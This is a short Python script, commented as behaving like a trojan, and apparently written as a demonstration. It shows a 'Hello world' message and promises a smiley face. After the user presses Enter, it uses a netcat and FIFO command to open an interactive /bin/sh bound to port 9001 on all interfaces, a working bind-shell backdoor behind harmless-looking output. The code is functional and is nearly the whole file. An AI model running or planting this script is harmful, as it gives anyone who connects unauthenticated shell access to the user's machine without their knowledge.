import subprocess

# Conceptually, this python script acts the same as a trojan. 

print("Hello world")

print("Hit enter to see a smiley face")

input()

command = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9001 > /tmp/f"

subprocess.call(command, shell=True)
